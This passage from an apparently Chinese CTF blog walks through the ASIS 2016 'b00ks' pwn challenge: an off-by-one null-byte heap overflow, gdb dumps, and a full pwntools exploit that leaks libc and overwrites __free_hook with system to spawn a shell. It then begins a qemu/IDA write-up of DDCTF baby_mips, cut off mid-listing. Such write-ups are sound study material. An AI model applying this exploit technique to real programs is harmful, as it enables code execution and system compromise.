class="string">&quot;Enter book description: &quot;</span>, *(_QWORD *)&amp;v1);</span><br><span class="line">        <span class="keyword">if</span> ( read_input(v5, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v1 - <span class="number">1</span>)) )</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">            </span><br><span class="line"><span class="comment">// allocate book struct</span></span><br><span class="line">v3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( v3 )</span><br><span class="line">&#123;</span><br><span class="line">    *((_DWORD *)v3 + <span class="number">6</span>) = v1;</span><br><span class="line">    *((_QWORD *)global_book_struct_array + v2) = v3;</span><br><span class="line">    *((_QWORD *)v3 + <span class="number">2</span>) = v5;</span><br><span class="line">    *((_QWORD *)v3 + <span class="number">1</span>) = ptr;</span><br><span class="line">    *(_DWORD *)v3 = ++book_counts;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，通过分析，book struct的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book_struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> book_id;    <span class="comment">// offset:0</span></span><br><span class="line">    <span class="keyword">char</span>* book_name;    <span class="comment">// offset:8    malloc(size)</span></span><br><span class="line">    <span class="keyword">char</span>* book_description;    <span class="comment">// offset:16     malloc(size)</span></span><br><span class="line">    <span class="keyword">int</span> book_description_size;  <span class="comment">// offset:24</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>程序中用于读取输入的read_input()函数(函数名字已重命名)存在off-by-one漏洞，当输入数据的长度正好为a2时，会向buf中越界写入一个字节<code>\x00</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">read_input</span><span class="params">(<span class="keyword">void</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    buf = a1;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)buf == <span class="number">10</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      buf = (<span class="keyword">char</span> *)buf + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)buf = <span class="number">0</span>;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="信息泄露漏洞"><a href="#信息泄露漏洞" class="headerlink" title="信息泄露漏洞"></a>信息泄露漏洞</h4><p>由于<code>author_name_ptr</code>和<code>global_book_struct_array</code>之间正好相差32个字节，当输入的author_name长度为32时，会向<code>author_name_ptr</code>中越界写入一个字节<code>\x00</code>。之后，在创建book_struct时，会将其地址保存在<code>global_book_struct_array</code>中，覆盖之前的字符串截断符<code>\x00</code>。因此，通过打印author_name可以实现信息信泄露。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000202008                                         ; .data:off_202008o</span><br><span class="line">.data:0000000000202010 global_book_struct_array dq offset unk_202060</span><br><span class="line">.data:0000000000202010                                         ; DATA XREF: sub_B24:loc_B38o</span><br><span class="line">.data:0000000000202010                                         ; delete_book:loc_C1Bo ...</span><br><span class="line">.data:0000000000202018 author_name_ptr dq offset unk_202040    ; DATA XREF: input_author_name+15o</span><br><span class="line">.data:0000000000202018                                         ; print_book+CAo</span><br></pre></td></tr></table></figure><h4 id="off-by-one漏洞"><a href="#off-by-one漏洞" class="headerlink" title="off-by-one漏洞"></a>off-by-one漏洞</h4><p>通过修改author_name可以向<code>author_name_ptr</code>中越界写入一个字节<code>\x00</code>，这样会覆盖<code>global_book_struct_array</code>中保存的第一个book_struct的地址。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>主要思想如下：创建2个book，通过单字节溢出，使得<code>book1_struct</code>指针指向<code>book1_description</code>中；然后在<code>book1_description</code>中伪造一个<code>book1_struct</code>，使得其中的<code>book1_description_ptr</code>指向<code>book2_description_ptr</code>；通过先后修改<code>book1_description</code>和<code>book2_description</code>，从而实现任意地址写任意内容的功能。</p><blockquote><p>为了方便调试，临时禁用了系统的地址随机化功能：<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p></blockquote><h4 id="创建book"><a href="#创建book" class="headerlink" title="创建book"></a>创建book</h4><p>book1的description的大小要尽量大一点(如140)，保证当单字节溢出后book1_struct指针落在book1的description中，从而对其可控，为后续伪造book1_struct打下基础。book2的description的大小越大越好(如0x21000)，这样会通过mmap()函数去分配堆空间，而该堆地址与libc的基址相关，这样通过泄露该堆地址可以计算出libc的基址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> x/10xg 0x555555554000+0x202040</span></span><br><span class="line">0x555555756040:0x6161616161616161 (&lt;== author_name)0x6161616161616161  </span><br><span class="line">0x555555756050:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555756060:0x0000555555758160 (&lt;== book1_struct_ptr)0x0000555555758190 (&lt;== book2_struct_ptr)</span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> x/60xg 0x0000555555758010</span></span><br><span class="line">0x555555758010:0x00000000000000000x00000000000000a1 (&lt;== heap: book1_name)</span><br><span class="line">0x555555758020:0x0000315f6b6f6f620x0000000000000000</span><br><span class="line">... ...</span><br><span class="line">0x5555557580b0:0x00000000000000000x00000000000000a1 (&lt;== heap: book1_description)</span><br><span class="line">0x5555557580c0:0x6f622074737269660x7461657263206b6f</span><br><span class="line">... ...</span><br><span class="line">0x555555758100:0x00000000000000000x0000000000000000</span><br><span class="line">... ...</span><br><span class="line">0x555555758150:0x00000000000000000x0000000000000031 (&lt;== heap: book1_struct)</span><br><span class="line">0x555555758160:0x00000000000000010x0000555555758020</span><br><span class="line">0x555555758170:0x00005555557580c00x000000000000008c</span><br><span class="line">0x555555758180:0x00000000000000000x0000000000000031 (&lt;== heap: book2_struct)</span><br><span class="line">0x555555758190:0x00000000000000020x00007ffff7fd2010</span><br><span class="line">0x5555557581a0:0x00007ffff7fb00100x0000000000021000</span><br><span class="line">0x5555557581b0:0x00000000000000000x0000000000020e51</span><br></pre></td></tr></table></figure><p>从<code>global_book_strcut_array(0x555555756060)</code>中可以看到，当发生null byte溢出时，<code>book1_struct</code>的指针变为<code>0x555555758100</code>，正好落在book1_description的范围内。</p><h4 id="伪造book1-struct"><a href="#伪造book1-struct" class="headerlink" title="伪造book1_struct"></a>伪造book1_struct</h4><p>为了使得伪造的<code>book1_description_ptr</code>指向<code>book2_description_ptr</code>，需要先知道book2_struct的地址，可以通过打印author_name从而泄露得到该地址。</p><p>之后通过修改<code>book1_description</code>，伪造一个<code>book1_struct</code>。可以看到<code>book1_description_ptr</code>已经指向了<code>book2_name_ptr</code>。(通过+8就能指向<code>book2_description_ptr</code>)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> x/60xg 0x0000555555758010</span></span><br><span class="line">0x5555557580b0:0x00000000000000000x00000000000000a1</span><br><span class="line">... ...</span><br><span class="line">0x5555557580f0:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555758100:0x00000000000000010x0000555555758198</span><br><span class="line">0x555555758110:0x0000555555758198 (&lt;== 指向book2的name_ptr)0x000000000000ffff</span><br><span class="line">... ...</span><br><span class="line">0x555555758150:0x00000000000000000x0000000000000031</span><br><span class="line">0x555555758160:0x00000000000000010x0000555555758020</span><br><span class="line">0x555555758170:0x00005555557580c00x000000000000008c</span><br><span class="line">0x555555758180:0x00000000000000000x0000000000000031</span><br><span class="line">0x555555758190:0x00000000000000020x00007ffff7fd2010</span><br><span class="line">0x5555557581a0:0x00007ffff7fb00100x0000000000021000</span><br><span class="line">0x5555557581b0:0x00000000000000000x0000000000020e51</span><br></pre></td></tr></table></figure><h4 id="空字节覆盖"><a href="#空字节覆盖" class="headerlink" title="空字节覆盖"></a>空字节覆盖</h4><p>修改author_name，覆盖<code>global_book_struct_array</code>中保存的第一个<code>book_struct</code> 指针。之后通过打印book可以泄露得到<code>book2_name_ptr</code>, 从而得到该地址与libc基址之间的偏移。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> vmmap</span> </span><br><span class="line">Start              End                PermName</span><br><span class="line">0x0000555555554000 0x0000555555556000 r-xp/.../b00ks</span><br><span class="line">... ...</span><br><span class="line">0x0000555555757000 0x0000555555779000 rw-p[heap]</span><br><span class="line">0x00007ffff7a0d000 (&lt;== 计算与该地址的偏移) 0x00007ffff7bcd000 r-xp/.../libc.so.6</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 ---p/.../libc.so.6</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 r--p/.../libc.so.6</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p/.../libc.so.6</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 rw-pmapped</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fb0000 0x00007ffff7ff7000 rw-pmapped</span><br></pre></td></tr></table></figure><h4 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h4><p>通过先后修改<code>book1_description</code>和<code>book2_description</code>，可以实现任意地址写任意内容的功能。由于该程序启用了<code>FULL RELRO</code>保护措施，无法对<code>GOT</code>进行改写，但是可以改写<code>__free_hook</code>或<code>__malloc_hook</code>。</p><p>结合前面泄露的<code>book2_name_ptr</code>和计算得到的偏移，可以计算出libc的基址，进一步可得到<code>__free_hook</code>和<code>system</code>函数运行时的地址，以及libc中字符串”/bin/sh”的地址。之后将<code>__free_hook</code>指向的内容修改为<code>system</code>的地址，在调用<code>free</code>函数时，由于<code>__free_hook</code>里面的内容不为<code>NULL</code>，从而执行指向的指令。</p><p>完整的漏洞利用代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_book</span>(<span class="params">target, name_size, book_name, desc_size, book_desc</span>):</span></span><br><span class="line">    target.recv()</span><br><span class="line">    target.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    target.sendlineafter(<span class="string">&#x27;Enter book name size: &#x27;</span>, <span class="built_in">str</span>(name_size))</span><br><span class="line">    target.sendlineafter(<span class="string">&#x27;Enter book name (Max 32 chars): &#x27;</span>, book_name)</span><br><span class="line">    target.sendlineafter(<span class="string">&#x27;Enter book description size: &#x27;</span>, <span class="built_in">str</span>(desc_size))</span><br><span class="line">    target.sendlineafter(<span class="string">&#x27;Enter book description: &#x27;</span>, book_desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_book</span>(<span class="params">target, book_id</span>):</span></span><br><span class="line">    target.recv()</span><br><span class="line">    target.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    target.sendlineafter(<span class="string">&#x27;Enter the book id you want to delete: &#x27;</span>, <span class="built_in">str</span>(book_id))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_book</span>(<span class="params">target, book_id, book_desc</span>):</span></span><br><span class="line">    target.recv()</span><br><span class="line">    target.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    target.sendlineafter(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>, <span class="built_in">str</span>(book_id))</span><br><span class="line">    target.sendlineafter(<span class="string">&#x27;Enter new book description: &#x27;</span>, book_desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_book</span>(<span class="params">target</span>):</span></span><br><span class="line">    target.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    target.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_author_name</span>(<span class="params">target, name</span>):</span></span><br><span class="line">    target.recv()</span><br><span class="line">    target.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    target.sendlineafter(<span class="string">&#x27;Enter author name: &#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_author_name</span>(<span class="params">target, name</span>):</span></span><br><span class="line">    target.sendlineafter(<span class="string">&#x27;Enter author name: &#x27;</span>, name)</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    target = process(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    target = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">5678</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># used for debug</span></span><br><span class="line">image_base = <span class="number">0x555555554000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    pwnlib.gdb.attach(target, <span class="string">&#x27;b *%d\nc\n&#x27;</span> % (image_base+<span class="number">0x1245</span>))</span><br><span class="line"></span><br><span class="line">input_author_name(target, <span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">create_book(target, <span class="number">140</span> ,<span class="string">&#x27;book_1&#x27;</span>, <span class="number">140</span>, <span class="string">&#x27;first book created&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak boo1_struct addr</span></span><br><span class="line">print_book(target)</span><br><span class="line">target.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">temp = target.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)</span><br><span class="line">book1_struct_addr = u64(temp[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">book2_struct_addr = book1_struct_addr + <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">create_book(target, <span class="number">0x21000</span>, <span class="string">&#x27;book_2&#x27;</span>, <span class="number">0x21000</span>, <span class="string">&#x27;second book create&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake book1_struct</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span> + p64(<span class="number">1</span>) + p64(book2_struct_addr + <span class="number">8</span>) * <span class="number">2</span> + p64(<span class="number">0xffff</span>)</span><br><span class="line">edit_book(target, <span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">change_author_name(target, <span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"><span class="comment"># leak book2_name ptr</span></span><br><span class="line">print_book(target)</span><br><span class="line"></span><br><span class="line">target.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">temp = target.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)</span><br><span class="line">book2_name_ptr = u64(temp[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># find in debug: mmap_addr - libcbase</span></span><br><span class="line">offset =  <span class="number">0x7ffff7fd2010</span> - <span class="number">0x7ffff7a0d000</span></span><br><span class="line">libcbase = book2_name_ptr - offset</span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>] + libcbase</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>] + libcbase</span><br><span class="line">binsh_addr = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>() + libcbase</span><br><span class="line"></span><br><span class="line">payload = p64(binsh_addr) + p64(free_hook)</span><br><span class="line">edit_book(target, <span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(system)</span><br><span class="line">edit_book(target, <span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">delete_book(target, <span class="number">2</span>)</span><br><span class="line">target.interactive()</span><br></pre></td></tr></table></figure><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly9hbXJpdGFiaTBzLndvcmRwcmVzcy5jb20vMjAxNi8wNi8xMS9hc2lzLWN0Zi1xdWFscy0yMDE2LWIwMGtzLXdyaXRldXAv">ASIS CTF Quals 2016 b00ks Writeup<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yMjU2MTEuaHRt">Asis CTF 2016 b00ks<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvcHduL2hlYXAvb2ZmX2J5X29uZS8=">堆中的 Off-By-One<i class="fa fa-external-link-alt"></i></span></li></ul><h3 id="附件下载"><a href="#附件下载" class="headerlink" title="附件下载"></a>附件下载</h3><p><a href="./samples.zip">b00ks</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solve baby_mips with angr</title>
      <link href="2018/05/07/Solve-baby-mips-with-angr/"/>
      <url>2018/05/07/Solve-baby-mips-with-angr/</url>
      
        <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p><code>baby_mips</code>是DDCTF 2018 逆向的第1题，是MIPS指令架构的。MIPS指令架构是一种采用精简指令集的处理器架构，常用于路由器等嵌入式设备中。</p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>使用<code>file</code>命令查看文件格式，如下。可以看到程序为MIPS架构 小端格式，同时是通过静态链接生成的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file baby_mips</span><br><span class="line">baby_mips: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, stripped</span><br></pre></td></tr></table></figure><a id="more"></a><p>使用IDA Pro加载程序后，查看程序的字符串列表，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.rodata:00412FC0 00000009 C Var[0]:                                               </span><br><span class="line">.rodata:00412FD0 00000009 C Var[1]:                                               </span><br><span class="line">.rodata:00412FDC 00000009 C Var[2]:                                               </span><br><span class="line">.rodata:00412FE8 00000009 C Var[3]:                                               </span><br><span class="line">.rodata:00412FF4 00000009 C Var[4]:                                               </span><br><span class="line">.rodata:00413000 00000009 C Var[5]:                                               </span><br><span class="line">.rodata:0041300C 00000009 C Var[6]:                                               </span><br><span class="line">.rodata:00413018 00000009 C Var[7]:                                               </span><br><span class="line">.rodata:00413024 00000009 C Var[8]:                                               </span><br><span class="line">.rodata:00413030 00000009 C Var[9]:                                               </span><br><span class="line">.rodata:0041303C 0000000A C Var[10]:                                              </span><br><span class="line">.rodata:00413048 0000000A C Var[11]:                                              </span><br><span class="line">.rodata:00413054 0000000A C Var[12]:                                              </span><br><span class="line">.rodata:00413060 0000000A C Var[13]:                                              </span><br><span class="line">.rodata:0041306C 0000000A C Var[14]:                                              </span><br><span class="line">.rodata:00413078 0000000A C Var[15]:                                              </span><br><span class="line">.rodata:00413084 00000036 C The flag is: DDCTF&#123;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c&#125;\n</span><br><span class="line">.rodata:004130BC 00000006 C Wrong</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure><p>查找字符串<code>The flag is: DDCTF ...</code>的交叉引用，进入sub_403238函数。在函数开始处，调用了sub_4044d0、sub_4038a0等函数，根据字符串信息，猜测可能是读取输入。之后，在0x40365c处跳转到loc_400420处执行代码，之后根据v0的值进行判断，如下：</p><img data-src="images/baby_mips_1.png"><p>跳转到loc_400420处，代码比较乱，存在很多IDA无法识别的代码块，同时中间夹杂着很多数据，导致无法分析具体的处理流程。下面尝试进行动态调试分析。</p><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>由于程序是MIPS指令架构的，而通常我们使用的电脑是x86架构的，无法直接运行该程序，这时可以借助Qemu模拟器来运行程序。QEMU是运行在用户层的开源全虚拟化解决方案，可以在Intel机器上虚拟出完整的操作系统 。QEMU主要有两种运作模式：</p><ul><li><code>User Mode</code>：即使用者模式，能单独运行那些为不同处理编译的Linux程序；</li><li><code>System Mode</code>：即系统模式，能够模拟整个系统，包括中央处理器及其他周边设备。</li></ul><p>由于<code>baby_mips</code>程序是通过静态链接生成的，为了方便，在<code>User Mode</code>下使用QEMU来运行该程序。以Ubuntu为例，首先安装qemu-static，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install qemu-static</span></span><br></pre></td></tr></table></figure><p>安装完成后，运行该程序，如下。根据提示随便输入几个数字，提示<code>Illegal instruction</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> qemu-mipsel-static ./baby_mips</span></span><br><span class="line">Var[0]: 0</span><br><span class="line">Var[1]: 1</span><br><span class="line">Var[2]: 2</span><br><span class="line">Var[3]: 3</span><br><span class="line">Var[4]: 4</span><br><span class="line">Var[5]: 5</span><br><span class="line">Var[6]: 6</span><br><span class="line">Var[7]: 7</span><br><span class="line">Var[8]: 8</span><br><span class="line">Var[9]: 9</span><br><span class="line">Var[10]: 10</span><br><span class="line">Var[11]: 11</span><br><span class="line">Var[12]: 12</span><br><span class="line">Var[13]: 13</span><br><span class="line">Var[14]: 14</span><br><span class="line">Var[15]: 15</span><br><span class="line">qemu: uncaught target signal 4 (Illegal instruction) - core dumped</span><br><span class="line">Illegal instruction (core dumped)</span><br></pre></td></tr></table></figure><p>下面通过动态调试来定位错误。</p><h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><p>qemu系列命令提供了一个<code>-g</code>选项，用来等待外部的gdb调试器连接。下面指定<code>1234</code>端口来等待调试器连接，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> qemu-mipsel-static -g 1234 ./baby_mips</span></span><br></pre></td></tr></table></figure><p>之后可以采用gdb调试器来进行调试，这里使用IDA Pro来进行调试。首先选择调试器为”Remote GDB debugger”</p><img data-src="images/baby_mips_2.png"><p>之后，在”Debugger”-&gt;”Process options”中设置对应的参数</p><img data-src="images/baby_mips_3.png"><p>然后，点击”Debugger”-&gt;”Attach to process”即可开始调试。通过跟踪程序的执行流程，发现当程序运行到0x400430时会提示错误<code>Illegal instruction</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 